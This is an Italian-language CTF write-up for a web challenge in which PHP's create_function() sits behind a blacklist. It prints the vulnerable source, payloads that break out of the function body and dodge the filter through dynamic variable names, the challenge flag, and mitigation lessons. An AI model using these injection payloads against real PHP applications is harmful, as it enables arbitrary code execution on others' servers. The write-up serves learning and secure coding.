# Writeup: WS_1.02 - PHPisLovePHPisLife

## Overview
- **Categoria:** Web  
- **Autore:** bonaff  
- **Difficoltà:** 496  
- **Stato:** Down (last checked: 19 hours ago)  
- **URL:** [http://phpislove.challs.cyberchallenge.it/](http://phpislove.challs.cyberchallenge.it/)

## Descrizione 📝
La sfida è incentrata sull’analisi di un codice PHP che utilizza la funzione **`create_function()`**, deprecata in PHP 7.2 e rimossa in PHP 8.0. Questa funzione, internamente, fa uso di `eval()`, rendendo possibile eseguire codice arbitrario se non vengono implementati adeguati controlli di sicurezza. Il codice fornito dal challenge implementa una blacklist di funzioni, variabili e caratteri, ma presenta comunque una falla sfruttabile.

### Codice Sorgente
```php
<?php 
if(isset($_POST['code'])) {
    $code = $_POST['code'];
    // I <3 blacklists
    $characters = ['\`', '\[', '\*', '\.', '\\\\', '\='];
    $classes = get_declared_classes();
    $functions = get_defined_functions()['internal'];
    $strings = ['eval', 'include', 'require', 'function', 'flag', 'echo'];
    $variables =  ['_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS'];

    $blacklist = array_merge($characters, $classes, $functions, $variables, $strings);

    foreach ($blacklist as $blacklisted) {
        if (preg_match('/' . $blacklisted . '/im', $code)) {
            $output = 'No hacks pls';
        }
    }

    if(!isset($output)){
        $my_function = create_function('', $code);
        // $output = $my_function(); // I don't trust you
        $output = 'This function is disabled.';
    }
    echo $output;
}
?>
```

### Analisi della Blacklist
- **Caratteri e Pattern**: Sono bloccati simboli come `` ` ``, `` [ ``, `` * ``, `` . ``, `` \ ``, `` = ``.
- **Classi e Funzioni Interne**: Viene bloccata la maggior parte delle funzioni di base e delle classi interne di PHP.
- **Variabili Globali**: Vengono bloccate variabili come `$_GET`, `$_POST`, `$_SERVER`, ecc.
- **Stringhe Sensibili**: Parole chiave come `eval`, `include`, `require`, `function`, `flag`, `echo` sono anch’esse filtrate.

Nonostante questi filtri, la vulnerabilità sta nell’uso di `create_function()` che permette, con un payload opportunamente formulato, di iniettare codice eseguibile.

## Soluzione 🎯

### 1. Bypass dei Filtri
- **Evitare `flag`**: Non possiamo scrivere direttamente la parola `flag`.
- **Evitare `echo`**: Non possiamo utilizzare la funzione `echo`.
- **Evitare `eval`**: È anch’essa blacklistata.

Tuttavia, possiamo usare una strategia per costruire dinamicamente la variabile `$flag` senza digitare la stringa `flag` in modo esplicito. Inoltre, possiamo utilizzare la funzione `print()` al posto di `echo`.

### 2. Primo Test: Stampa Personalizzata
Inizialmente, si è provato un semplice payload di test:
```
}print("Test");// 
```
Il codice iniettato si chiude con `}`, poi esegue `print("Test");` e infine commenta la chiusura della funzione creata da `create_function()`. Il risultato:
```
TestThis function is disabled.
```
Per evitare la stampa di `"This function is disabled."`, è sufficiente aggiungere `die();` subito dopo la stampa:
```
}print("Test");die();// 
```
Risultato:
```
Test
```

### 3. Ottenere la Flag
La variabile `$flag` è probabilmente definita nello scope del codice, ma il termine `flag` è blacklistato. Possiamo costruire dinamicamente il nome della variabile:
```php
${"fl${''}ag"}
```
In questo modo, `fl${''}ag` si risolve in `flag` senza scrivere direttamente `flag`.

Il payload finale è:
```
}print(${"fl${''}ag"});die();// 
```
- **`}`**: Chiude la funzione di `create_function`.
- **`print(${"fl${''}ag"});`**: Stampa il contenuto della variabile `$flag`.
- **`die();`**: Termina l’esecuzione, evitando il messaggio “This function is disabled.”.
- **`//`**: Commenta la fine della riga.

### 4. Ottenimento della Flag
Inviando il payload al parametro `code`, si ottiene la risposta:

## Flag 🏁
```
CCIT{Wh4t_Ar3_You_Do1ng_ou7_of_My_Sandb0x}
```

## Lezioni Apprese 📚
- **Deprecazione di `create_function()`:** L’uso di questa funzione, che sfrutta `eval()`, può portare a gravi vulnerabilità di code injection.
- **Evitare Blacklist:** Una blacklist può essere facilmente aggirata con trucchi di string interpolation e manipolazione di variabili.
- **Stampa senza `echo`:** Se `echo` è blacklistato, si può usare `print()` o altre funzioni per mostrare dati.
- **Mitigazioni:** Utilizzare alternative moderne come le **closure** o le **arrow function** in PHP per evitare l’uso di `eval()`.

## Tools Utilizzati 🛠️
- **Browser Web / cURL**: Per inviare il payload al parametro `code`.
- **Editor di Testo**: Per analizzare il codice sorgente e creare il payload.

---

*Writeup by Luca Crippa - Last Updated: 2024*
